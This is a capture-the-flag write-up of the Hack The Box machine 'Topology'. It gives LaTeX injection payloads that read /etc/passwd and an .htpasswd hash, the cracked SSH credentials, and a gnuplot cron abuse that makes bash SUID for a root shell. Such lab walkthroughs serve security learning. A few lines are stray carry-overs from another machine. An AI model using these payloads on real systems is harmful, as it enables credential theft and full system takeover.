---
title: Hack The Box - Topology
date: 2023-09-05 13:33:37 +0200
categories:
  - HackTheBox
tags:
  - HTB
comments: true
---

HTB Topology Machine - https://www.hackthebox.com/machines/topology

### Scanning & Enumeration
Scan the machine first with Nmap tool
```
nmap -A 10.10.11.217
```
`22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)`
`53/tcp open  domain? syn-ack`
`80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))`

Add the machine Ip to: `/etc/hosts`
	`10.10.11.217 topology.htb`

Navigating to the site:

![556](/assets/img/posts/Pasted image 20260819192048.png)

We will found a link: <http://latex.topology.htb/equation.php> , so we will add it to the: `/etc/hosts`
	`10.10.11.217 topology.htb latex.topology.htb`

According to the webpage description, it seems to use an expression with a specific syntax to generate images of mathematical formulas in a specific format for download.

So lets can subdomains, to find something interesting
```
ffuf -u [http://topology.htb](http://topology.htb) -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.topology.htb" -fc 200
```

Output:
FUZZ: /dev

So add `dev.topology.htb` to `/etc/hosts`
	`10.10.11.217 topology.htb latex.topology.htb dev.topology.htb`


Fuzzing for subdomains eventually we get three hits. The first one `dev` returns us a 401 “Unauthorized” message, browsing to it we bump up against a basic auth window.

Browsing to `latex` we see this:

![](/assets/img/posts/Pasted image 20260822103845.png)

I decide to take a look at `equation.php`

![](/assets/img/posts/Pasted image 20260822103858.png)




LaTeX (“Lah-tech”) is a typesetting system that is widely used for producing scientific and mathematical documents. LaTeX is not a word processor but rather a markup language, meaning you compose your document using plain text files with specific syntax to format the text and insert mathematical symbols, equations, and various other elements.

### Exploitation & Gaining Access
Search for any exploitable vulnerabilities in LaTeX.
	<https://0day.work/hacking-with-latex/>

It is found that there may be a file reading vulnerability. so trying some command, i suspect there is a WAF, and only one command to read a line can bypass this WAF:
```
\newread\file
\openin\file=/etc/passwd
\read\file to\line
\text{\line}
\closein\file
```

!/assets/img/posts/Pasted image 20250816232104.png

**Now There are Two Problems:**
- How to read multiple lines?
- What file to read?

Regarding to the first question **How to read multiple lines?**
After a series of searches, found:
https://book.hacktricks.xyz/pentesting-web/formula-doc-latex-injection
https://hacktricks.wiki/en/pentesting-web/formula-csv-doc-latex-ghostscript-injection.html

Write the file path inside {} brackets. We could then store it in a variable using. So these commands can read files
```
# URL
http://latex.topology.htb/equation.php?eqn=

# Payloads
\input{/etc/passwd}
\include{password}   # load .tex file
\lstinputlisting{/usr/share/texmf/web2c/texmf.cnf}
\usepackage{verbatim}
\verbatiminput{/etc/passwd}
```

![](/assets/img/posts/Pasted image 20260822113123.png)

![](/assets/img/posts/Pasted image 20260822112910.png)

Only the command `\lstinputlisting{/usr/share/texmf/web2c/texmf.cnf}` will not trigger WAF
But when using this command to read `/etc/passwd`, what is returned is a blank page.

Regarding to the second question **What file to read?**
It can be found after a more in-depth search. In the Apache server, if a 401 error occurs when accessing a certain website directory with the http protocol instead of the https protocol, indicating that authentication is required, the password for this authentication is usually stored in the `.htpasswd` file in the form of hash. In this range, the `.htpasswd` file is located at `/var/www/dev/.htpasswd`.

Modify the payloads to point at the file I want, but it fails. Example:
```
\lstinputlisting{/etc/passwd}
```

After a series of searches, I found that adding `$` at both ends of the LaTeX command can run the LaTeX command in math mode.
	https://tex.stackexchange.com/questions/503/why-is-preferable-to
	https://www.kancloud.cn/thinkphp/latex/41806
	https://tex.stackexchange.com/questions/410863/what-are-the-differences-between-and

Then adding `$` to the command
```
Then adding `$` to the command
or
$\lstinputlisting{/var/www/dev/.htpasswd}$
```

The output will be:

![](/assets/img/posts/Pasted image 20260822111918.png)

Crack it with john:
```
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt 
```
Results: calculus20

We Now have a username and password `vdaisley:calculus20`

We can log-in to: `dev.topology.htb`

![596](/assets/img/posts/Pasted image 20260819203313.png)

Lets try to login with SSH:
```
ssh vdaisley@10.10.11.217
Password: calculus20

-bash-5.0$ ls
-bash-5.0$ cat user.txt
```

### Privilege Escalation
We will upload `LinPEAS` script, to see interesting things: https://github.com/peass-ng/PEASS-ng/blob/master/linPEAS/README.md
And `pspy64` https://github.com/DominicBreuker/pspy script too, to monitoring system traffic, to our kali first

First, upload `LinPEAS` using `scp` command from our kali machine to the HTB machine
```
scp /home/kali/Desktop/LinPEAS vdaisley@10.10.11.217:/tmp
Password: calculus20

-bash-5.0/tmp$ ./linpeas
```

![767](/assets/img/posts/Pasted image 20260819203811.png)

There is an unusual directory that I can write to: `/opt/gnuplot`. Weird, only write permissions, no read permissions.

Second, upload `pspy64` script to the machine, and run it to see what processes are running on the system: 
```
scp /home/kali/Desktop/pspy64 vdaisley@10.10.11.219:/tmp
Password: calculus20

emily@pilgrimage:~$ ./pspy64
```
We notice some interesting activity, and some timing tasks were found too

!/assets/img/posts/Pasted image 20250816232348.png

In the scheduled task, search for the file with the suffix `.plt` in the` /opt/gnuplot` directory with root authority and execute it directly, then you can write any `.plt` file to execute our command.

In the `/var/www/` directory, we discovered a new possible subdomain: `stats`

![](/assets/img/posts/Pasted image 20260819204407.png)

So add it to: `/etc/hosts`
	`10.10.11.217 topology.htb latex.topology.htb dev.topology.htb stats.topology.htb`

Apparently, root (UID=0) is finding and executing files that have the `.plt` ending. A `.plt` file is typically associated with GNU Plot `gnuplot`, which is a command-line driven plotting utility used for generating 2D and 3D plots. Gnuplot reads commands from a script file with a `.plt` extension to generate graphical plots based on the provided data.

An interesting fact about GNU plot files is that you can use them to execute code. We can simply create the file in the proper directory like this
```
vdaisley@topology:/opt/gnuplot$ echo 'system("chmod +s /usr/bin/bash")' > /opt/gnuplot/greper.plt
```

After a bit, the command will get executed and we will be able to drop into a root shell.
```
vdaisley@topology:/opt/gnuplot$ ls -lah /bin/bash
vdaisley@topology:/opt/gnuplot$ /usr/bin/bash -p  
bash-5.0# whoami          //root
```

![](/assets/img/posts/Pasted image 20260819204806.png)

Find the root user
```
cd /root
cat root.txt
```
